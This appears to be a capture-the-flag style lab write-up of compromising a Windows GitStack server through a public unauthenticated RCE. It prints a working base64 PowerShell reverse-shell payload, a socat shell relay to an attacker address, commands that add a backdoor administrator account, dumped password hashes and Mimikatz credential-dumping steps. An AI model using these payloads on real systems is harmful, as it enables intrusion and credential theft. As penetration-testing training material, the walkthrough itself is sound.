---
description: In the isolated network!
cover: >-
  https://images.unsplash.com/photo-1541728472741-03e45a58cf88?crop=entropy&cs=srgb&fm=jpg&ixid=MnwxOTcwMjR8MHwxfHNlYXJjaHw5fHxoYWNrZXJ8ZW58MHx8fHwxNjQ0OTUxOTI2&ixlib=rb-1.2.1&q=85
coverY: 421.77650429799417
---

# ðŸ”° 10.200.81.150 | Linux

{% hint style="info" %}
~~**Port Forwarding `80/http`**~~\
~~``~~Tried that using Chisel Local Port Forward but didn't work!
{% endhint %}

#### Use _<mark style="color:green;">**`sshuttle`**</mark>** ****and connect host to the local network**_

_****_![](<../../.gitbook/assets/image (17) (1).png>)_****_

## <mark style="color:purple;background-color:green;">\_\_Enumeration\_\_</mark>

<details>

<summary><mark style="color:purple;">NMAP</mark></summary>

```
Nmap scan report for 10.200.81.150
Host is up (0.00012s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.2.22 ((Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3)
|_http-title: Page not found at /
|_http-server-header: Apache/2.2.22 (Win32) mod_ssl/2.2.22 OpenSSL/0.9.8u mod_wsgi/3.3 Python/2.7.2 PHP/5.4.3
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GIT-SERV
|   NetBIOS_Domain_Name: GIT-SERV
|   NetBIOS_Computer_Name: GIT-SERV
|   DNS_Domain_Name: git-serv
|   DNS_Computer_Name: git-serv
|   Product_Version: 10.0.17763
|_  System_Time: 2022-02-16T22:41:11+00:00
|_ssl-date: 2022-02-16T22:41:14+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=git-serv
| Not valid before: 2022-02-15T10:50:13
|_Not valid after:  2022-08-17T10:50:13
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



</details>

<details>

<summary>Enumeration - <mark style="color:green;">WEB SERVICES</mark></summary>

**Technologies**

![](../../.gitbook/assets/image.png)

**Dirsearch | Gobuster**

```yaml
/cgi-bin/
/gitstack/
/rest
```

#### Page Screenshots

![](<../../.gitbook/assets/image (15).png>)![](<../../.gitbook/assets/image (16) (1).png>)

</details>

## <mark style="color:red;background-color:yellow;">\_\_Exploitation\_\_</mark>

### _<mark style="color:orange;">FOOTHOLD</mark>_

### Gitstack RCE (Unauthenticated)

Exploit POC used--> [https://github.com/kacperszurek/exploits/blob/master/GitStack/gitstack\_unauthenticated\_rce.py](https://github.com/kacperszurek/exploits/blob/master/GitStack/gitstack\_unauthenticated\_rce.py)\
[https://www.exploit-db.com/exploits/43777](https://www.exploit-db.com/exploits/43777)\
![](<../../.gitbook/assets/image (10).png>)\
![](<../../.gitbook/assets/image (7).png>)

* We successfully created a backdoor too at `/web/exploit-dexter9.php.` We get a pseudoshell which we can convert to a fully functional reverse shell using PHP / powershell.

![Rev shell not working directly](<../../.gitbook/assets/image (11) (1).png>)

### _<mark style="color:red;">GETTING SHELL</mark>_

#### Two-ways

* Given we have a fully stable shell on `.200`, we could upload a static copy of [netcat](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/ncat) and just catch the shell on the compromised host.
* We could set up a socat relay on .200 to forward a shell back to a listener on our attacker machine. _<mark style="color:yellow;">\[PRACTICE]</mark>_

### Setting up a relay to get a shell

{% hint style="info" %}
CentOS uses an always-on wrapper around the IPTables firewall called "`firewalld`". By default, this firewall is extremely restrictive, allowing access to only SSH / anything the sysadmin has specified. This is also why _Chisel port forward_ of port 80 wasn't working!

Before capturing (or relaying) shells, we need to open our desired port in the firewall:

`firewall-cmd --zone=public --add-port PORT/tcp`\
``![](<../../.gitbook/assets/image (11).png>)``
{% endhint %}

#### <mark style="color:red;background-color:yellow;">METHOD-1</mark> - SHELL ON COMPROMISED HOST

Start a listener on that host using `nc` static binary.\
Use Base64 powershell payload --> _Created at_ [_https://www.revshells.com/_](https://www.revshells.com)__

```powershell
powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwADAALgA4ADEALgAyADAAMAAiACwAMwAzADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
# Base64 encoded in Little Endian for WIN
```

![Burp Capture](<../../.gitbook/assets/image (18).png>)

We receive reverse shell on the compromised server as `nt authority\system`\
``![](<../../.gitbook/assets/image (17).png>)

Enumerating for interesting information

```
#GitStack\data\data.db
adminadmin@gitstack.com pbkdf2_sha256$10000$LvPhtKHL4m66$QVcepgdvIrks8AEOogZ3JV+trZRT8fMOsCyzA4nN0TQ=
poiuytrezcontact@smartmobilesoftware.com sha1$3b696$d54c0bb1124b1a2550636cc5001879f1bbb25abe

#GitStack\data\passwdfile
twreath:$apr1$piSKZ1Ms$3dzcdMG3eFK9bhC2U7Dup/
```

<mark style="color:red;background-color:yellow;"></mark>

#### <mark style="color:red;background-color:yellow;">METHOD-2</mark>- RELAY SHELL TO ATTACKER USING `SOCAT`&#x20;

```bash
#ON COMPROMISED HOST
./socat-dexter9 tcp-l:33337,fork,reuseaddr tcp:10.50.82.178:12345 &
```

<mark style="color:red;background-color:yellow;"></mark>![](<../../.gitbook/assets/image (12).png>)<mark style="color:red;background-color:yellow;"></mark>![](<../../.gitbook/assets/image (9).png>)<mark style="color:red;background-color:yellow;"></mark>

### Gaining \*some\* Persistence on the new host

We know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985). Also since we are using `sshuttle`, we don't need anymore relaying!\
\
Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM.

**Create a new user**

```powershell
net user dexter9 d3xter123 /add
net localgroup Administrators dexter9 /add
net localgroup "Remote Management Users" dexter9 /add
```

![](<../../.gitbook/assets/image (6).png>)\
Now we can use `evilwinrm` to login from our attacker host (or `xfreerdp` for GUI).\
![](<../../.gitbook/assets/image (4).png>)

{% hint style="info" %}
This account will get deleted if the host is reset! We need to loot someone's hash for stable access.
{% endhint %}

### _<mark style="color:red;">POST EXPLOITATION</mark>_

* Transfer [Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/dievus/PowerShellForPentesters/main/Tools/Invoke-Mimikatz.ps1) or [mimikatz.exe](https://github.com/gentilkiwi/mimikatz/releases) to the Windows host.
* With **Mimikatz**, we give ourselves the Debug privilege -`privilege::debug`,and elevate our integrity to SYSTEM level - `token::elevate`. \
  Now dump the SAM database --> `lsa::dump` and gaining permanent persistence by using Pass-the-Hash attack.

